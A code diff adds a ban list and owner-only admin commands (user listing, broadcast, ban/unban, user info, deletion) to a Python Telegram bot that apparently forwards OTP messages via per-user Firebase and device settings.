@@ -70,6 +70,21 @@ USER_CONFIG_FILE = os.path.join("data", "user_config.json")
 
 user_configs = {}
 last_otp = {}
+banned_users = set()
+
+BANNED_FILE = os.path.join("data", "banned.json")
+
+def load_banned():
+    global banned_users
+    if os.path.exists(BANNED_FILE):
+        with open(BANNED_FILE, "r") as f:
+            banned_users = set(json.load(f))
+
+def save_banned():
+    with open(BANNED_FILE, "w") as f:
+        json.dump(list(banned_users), f)
+
+load_banned()
 
 def load_user_configs():
     global user_configs, last_otp
@@ -114,6 +129,9 @@ async def send_join_required_message(update: Update, context: ContextTypes.DEFAU
 
 async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
     user_id = update.effective_user.id
+    if str(user_id) in banned_users:
+        await update.effective_message.reply_text("🚫 <b>You are banned from using this bot.</b>", parse_mode="HTML")
+        return False
     try:
         member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
         if member.status in ["member", "administrator", "creator"]:
@@ -125,6 +143,9 @@ async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         logger.error(f"Membership check error for {user_id}: {e}")
         await send_join_required_message(update, context)
         return False
+
+def is_owner(user_id: int) -> bool:
+    return user_id == OWNER_CHAT_ID
 
 async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -233,6 +254,124 @@ async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Only new incoming messages will be forwarded.",
         parse_mode='HTML'
     )
+
+# ============================
+# ADMIN COMMANDS (OWNER ONLY)
+# ============================
+async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_owner(update.effective_user.id):
+        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
+        return
+    if not user_configs:
+        await update.message.reply_text("📭 <b>No users yet.</b>", parse_mode="HTML")
+        return
+    msg = f"👥 <b>Total Users: {len(user_configs)}</b>\n\n"
+    for uid, cfg in user_configs.items():
+        fb = cfg.get("firebase_url", "N/A")
+        otp = cfg.get("otpNumber", "N/A")
+        dev = cfg.get("selectedDevice", {}).get("deviceId", "N/A")
+        ban = "🚫 Banned" if uid in banned_users else "✅ Active"
+        msg += f"🆔 <code>{uid}</code> {ban}\n🌐 <code>{fb}</code>\n📱 Device: <code>{dev}</code>\n📞 OTP#: <code>{otp}</code>\n\n"
+    for chunk in [msg[i:i+4000] for i in range(0, len(msg), 4000)]:
+        await update.message.reply_text(chunk, parse_mode="HTML")
+
+async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_owner(update.effective_user.id):
+        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
+        return
+    if not context.args:
+        await update.message.reply_text("❌ <b>Usage:</b> /broadcast message text yahan likho", parse_mode="HTML")
+        return
+    text = " ".join(context.args)
+    success, fail = 0, 0
+    for uid in user_configs.keys():
+        try:
+            await context.bot.send_message(chat_id=int(uid), text=f"📢 <b>Message from Admin:</b>\n\n{text}", parse_mode="HTML")
+            success += 1
+        except Exception:
+            fail += 1
+    await update.message.reply_text(f"✅ Sent: <b>{success}</b> | ❌ Failed: <b>{fail}</b>", parse_mode="HTML")
+
+async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_owner(update.effective_user.id):
+        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
+        return
+    if not context.args:
+        await update.message.reply_text("❌ <b>Usage:</b> /ban 123456789", parse_mode="HTML")
+        return
+    target = context.args[0]
+    banned_users.add(target)
+    save_banned()
+    await update.message.reply_text(f"🚫 <b>User <code>{target}</code> banned.</b>", parse_mode="HTML")
+
+async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_owner(update.effective_user.id):
+        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
+        return
+    if not context.args:
+        await update.message.reply_text("❌ <b>Usage:</b> /unban 123456789", parse_mode="HTML")
+        return
+    target = context.args[0]
+    banned_users.discard(target)
+    save_banned()
+    await update.message.reply_text(f"✅ <b>User <code>{target}</code> unbanned.</b>", parse_mode="HTML")
+
+async def admin_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_owner(update.effective_user.id):
+        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
+        return
+    if not context.args:
+        await update.message.reply_text("❌ <b>Usage:</b> /userinfo 123456789", parse_mode="HTML")
+        return
+    uid = context.args[0]
+    cfg = user_configs.get(uid)
+    if not cfg:
+        await update.message.reply_text(f"❌ <b>User <code>{uid}</code> not found.</b>", parse_mode="HTML")
+        return
+    dev = cfg.get("selectedDevice", {})
+    ban_status = "🚫 Banned" if uid in banned_users else "✅ Active"
+    msg = (
+        f"👤 <b>User Info</b>\n"
+        f"🆔 ID: <code>{uid}</code>\n"
+        f"📊 Status: {ban_status}\n"
+        f"🌐 Firebase: <code>{cfg.get('firebase_url', 'N/A')}</code>\n"
+        f"📢 Channel ID: <code>{cfg.get('channel_id', 'N/A')}</code>\n"
+        f"📱 Device: <code>{dev.get('deviceId', 'N/A')}</code>\n"
+        f"📶 SIM Slot: <code>{dev.get('simSlotIndex', 'N/A')}</code>\n"
+        f"📞 SIM Phone: <code>{dev.get('simPhoneNumber', 'N/A')}</code>\n"
+        f"🔢 OTP Number: <code>{cfg.get('otpNumber', 'N/A')}</code>"
+    )
+    await update.message.reply_text(msg, parse_mode="HTML")
+
+async def admin_deleteuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_owner(update.effective_user.id):
+        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
+        return
+    if not context.args:
+        await update.message.reply_text("❌ <b>Usage:</b> /deleteuser 123456789", parse_mode="HTML")
+        return
+    uid = context.args[0]
+    if uid in user_configs:
+        del user_configs[uid]
+        save_user_configs()
+        await update.message.reply_text(f"🗑️ <b>User <code>{uid}</code> deleted.</b>", parse_mode="HTML")
+    else:
+        await update.message.reply_text(f"❌ <b>User not found.</b>", parse_mode="HTML")
+
+async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_owner(update.effective_user.id):
+        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
+        return
+    msg = (
+        "🛠️ <b>ADMIN PANEL</b>\n\n"
+        "/users – Sab users ki list\n"
+        "/userinfo [id] – Kisi user ki detail\n"
+        "/broadcast [msg] – Sab ko message bhejo\n"
+        "/ban [id] – User ban karo\n"
+        "/unban [id] – User unban karo\n"
+        "/deleteuser [id] – User ka data delete karo"
+    )
+    await update.message.reply_text(msg, parse_mode="HTML")
 
 # ============================
 # FIREBASE HELPERS
@@ -723,6 +862,15 @@ def main():
     app.add_handler(CommandHandler("help", help_command))
     app.add_handler(CommandHandler("devices", devices_command))
     app.add_handler(CommandHandler("resetforward", reset_forward))
+
+    # Admin commands
+    app.add_handler(CommandHandler("admin", admin_panel))
+    app.add_handler(CommandHandler("users", admin_users))
+    app.add_handler(CommandHandler("broadcast", admin_broadcast))
+    app.add_handler(CommandHandler("ban", admin_ban))
+    app.add_handler(CommandHandler("unban", admin_unban))
+    app.add_handler(CommandHandler("userinfo", admin_userinfo))
+    app.add_handler(CommandHandler("deleteuser", admin_deleteuser))
 
     app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel_message))
 
